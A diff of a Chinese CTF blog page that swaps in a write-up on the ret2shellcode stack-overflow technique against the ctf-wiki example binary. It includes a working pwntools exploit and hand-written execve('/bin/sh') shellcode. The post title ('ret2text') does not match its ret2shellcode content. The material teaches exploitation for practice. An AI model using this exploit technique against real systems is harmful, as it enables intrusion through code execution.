@@ -16,14 +16,16 @@
   <meta name="author" content="Xkeo">
   <meta name="keywords" content="">
   
-    <meta property="og:type" content="article">
-<meta property="og:title" content="pwn的一些常用命令">
-<meta property="og:url" content="http://kk-blog.top/posts/09672755a094/index.html">
+    <meta name="description" content="ret2shellcode原理ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2text">
+<meta property="og:url" content="http://kk-blog.top/posts/a4599bcf6259/index.html">
 <meta property="og:site_name" content="Xkeo&#39;s Blog">
+<meta property="og:description" content="ret2shellcode原理ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://kk-blog.top/img%5Cpage2.jpg">
-<meta property="article:published_time" content="2023-02-09T07:35:00.000Z">
-<meta property="article:modified_time" content="2023-02-15T08:42:02.315Z">
+<meta property="article:published_time" content="2023-02-14T12:30:00.000Z">
+<meta property="article:modified_time" content="2023-02-15T08:42:59.044Z">
 <meta property="article:author" content="Xkeo">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary_large_image">
@@ -31,7 +33,7 @@
   
   
   
-  <title>pwn的一些常用命令 - Xkeo&#39;s Blog</title>
+  <title>ret2text - Xkeo&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,13 +205,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img%5Cpage2.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('/img%5Ctopimg.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="pwn的一些常用命令"></span>
+            <span id="subtitle" data-typed-text="ret2text"></span>
           
         </div>
 
@@ -220,8 +222,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-09 15:35" pubdate>
-          2023年2月9日 下午
+        <time datetime="2023-02-14 20:30" pubdate>
+          2023年2月14日 晚上
         </time>
       </span>
     
@@ -232,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          1k 字
         
       </span>
     
@@ -243,7 +245,7 @@
         
         
         
-          1 分钟
+          9 分钟
         
       </span>
     
@@ -281,12 +283,29 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">pwn的一些常用命令</h1>
+            <h1 style="display: none">ret2text</h1>
             
             
               <div class="markdown-body">
                 
-                
+                <h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</strong></p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>文件:<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode</a></p>
+<p><strong>查看一下程序的保护机制</strong></p>
+<p><img src="https://pic.imgdb.cn/item/63ec9656f144a01007c509ac.png" srcset="/img/loading.gif" lazyload><br>没有任何保护</p>
+<p>ida查看代码</p>
+<p><img src="https://pic.imgdb.cn/item/63ec96c9f144a01007c61486.png" srcset="/img/loading.gif" lazyload></p>
+<p>gets函数可以溢出<br>然后看一下buf2的位置，看下是否可以执行，让我们插入shellcode<br><img src="https://pic.imgdb.cn/item/63ec9841f144a01007c9559a.png" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/63ec9864f144a01007c9ac71.png" srcset="/img/loading.gif" lazyload><br>具有可执行权限</p>
+<p><strong>求偏移量</strong><br>利用cyclic 200生成200个垃圾数据<br><img src="https://t.gmit.vip/2023/02/14/umt678.png" srcset="/img/loading.gif" lazyload></p>
+<p>运行输入后</p>
+<p><img src="https://t.gmit.vip/2023/02/14/vx31qq.png" srcset="/img/loading.gif" lazyload><br><img src="https://t.gmit.vip/2023/02/14/vxeey3.png" srcset="/img/loading.gif" lazyload></p>
+<p>偏移量为112</p>
+<p><strong>那么本类型题目思路：</strong><br><strong>1.让gets函数溢出，返回到buf2的位置</strong><br><strong>2.插入shellcode</strong><br><strong>3.在buf2中执行，获取shell</strong></p>
+<p><strong>exp</strong></p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>io = process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br><span class="hljs-comment">#pwntools自动生成shellcode</span><br><span class="hljs-keyword">shellcode </span>= asm(<span class="hljs-keyword">shellcraft.sh())</span><br><span class="hljs-keyword"></span><span class="hljs-comment">#手写shellcode</span><br><span class="hljs-comment">#shellcode = asm(&quot;&quot;&quot;</span><br> <span class="hljs-comment">#           push 0x68</span><br>  <span class="hljs-comment">#          push 0x732f2f2f</span><br>   <span class="hljs-comment">#         push 0x6e69622f</span><br>    <span class="hljs-comment">#        mov ebx, esp</span><br>     <span class="hljs-comment">#       xor ecx, ecx</span><br>      <span class="hljs-comment">#      xor edx, edx</span><br>        <span class="hljs-comment">#    push 11</span><br>         <span class="hljs-comment">#   pop eax</span><br>          <span class="hljs-comment">#  int 0x80</span><br>           <span class="hljs-comment">#     &quot;&quot;&quot;)</span><br><span class="hljs-comment">#buf2的地址</span><br><span class="hljs-keyword">buf2_addr </span>= <span class="hljs-number">0x804a080</span><br>payload = <span class="hljs-keyword">shellcode.ljust(112, </span><span class="hljs-keyword">b&#x27;a&#x27;) </span>+ p32(<span class="hljs-keyword">buf2_addr)</span><br><span class="hljs-keyword"></span><br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>
+
                 
               </div>
             
@@ -331,8 +350,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>pwn的一些常用命令</div>
-      <div>http://kk-blog.top/posts/09672755a094/</div>
+      <div>ret2text</div>
+      <div>http://kk-blog.top/posts/a4599bcf6259/</div>
     </div>
     <div class="license-meta">
       
@@ -344,7 +363,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年2月9日</div>
+          <div>2023年2月14日</div>
         </div>
       
       
